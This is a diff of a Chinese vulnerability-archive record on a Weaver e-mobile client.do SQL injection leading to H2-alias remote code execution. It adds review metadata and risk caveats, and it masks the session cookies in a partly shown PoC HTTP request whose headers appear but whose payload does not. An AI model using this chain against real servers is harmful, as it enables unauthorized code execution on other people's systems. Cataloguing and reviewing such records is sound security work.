@@ -1,14 +1,54 @@
 ---
 source: "gelusus/wxvl 公众号漏洞文库"
+title: "泛微e-mobile client.do uploadID SQL注入→H2别名远程代码执行"
+product: "泛微e-mobile"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+primary_identifiers: ""
+referenced_identifiers: ""
+identifier_status: "unknown"
+affected_scope: "泛称2024.3前及6.0，未分别对应证据；H2/Resin条件"
+prerequisites: "声称绕过但样本带会话，需区分是否必需"
+side_effects: "命令/代码执行示例可能改变主机状态"
+review_date: "2026-10-02"
+source_status: "unknown"
+archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AEE-Mobile%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%EF%BC%88RCE%EF%BC%89%E9%99%84POC.md"
+id: "vw-3dc9ae1c3f2c789c4cd1c2fe"
+entity_id: "ve-3dc9ae1c3f2c789c4cd1c2fe"
+schema_version: "1"
 ---
 
-#  泛微E-Mobile 远程命令执行漏洞（RCE）附POC  
+# 泛微e-mobile client.do uploadID SQL注入→H2别名远程代码执行
+
+## 条目说明
+
+- 对象与具体问题：泛微e-mobile；client.do uploadID SQL注入→H2别名RCE
+- 版本、配置及部署条件：泛称2024.3前及6.0，未分别对应证据；H2/Resin条件
+- 认证与权限前提：声称绕过但样本带会话，需区分是否必需
+- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。
+
+## 证据边界与更正
+
+以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。
+
+- 与E-Mobile6.0篇同method=getupload/H2链，本篇恢复name字段可互补
+- 版本段将多漏洞混述，不应把2024.3前强套此接口
+- multipart头体/各part空行缺失；普通命令执行描述漏SQL注入根因；无原文/补丁精确链接
+
+## 操作风险
+
+命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。
+
+## 技术资料与来源记录
+
 原创 安服仔
                     安服仔  北风漏洞复现文库   2026-01-28 02:04  
   
-# 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
-#   
-#   
+## 免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
+##   
+##   
   
 01  
   
@@ -16,10 +56,10 @@ source: "gelusus/wxvl 公众号漏洞文库"
   
 漏洞名称  
   
-# 泛微E-Mobile 远程命令执行漏洞  
+## 泛微E-Mobile 远程命令执行漏洞  
   
   
-#   
+##   
   
   
 02  
@@ -69,7 +109,7 @@ source: "gelusus/wxvl 公众号漏洞文库"
 漏洞复现  
   
 POC  
-```
+```http
 POST /client.do HTTP/1.1
 Host:  127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
@@ -77,7 +117,7 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
 Accept-Encoding: gzip, deflate
 Connection: close
-Cookie: JSESSIONID=abcrCRF1rJkt_4V8s_ikz; ecology_JSessionid=abcrCRF1rJkt_4V8s_ikz; testBanCookie=test; Systemlanguid=7
+Cookie: JSESSIONID=a*******************z; ecology_JSessionid=a*******************z; testBanCookie=test; Systemlanguid=7
 Upgrade-Insecure-Requests: 1
 Priority: u=0, i
 Pragma: no-cache
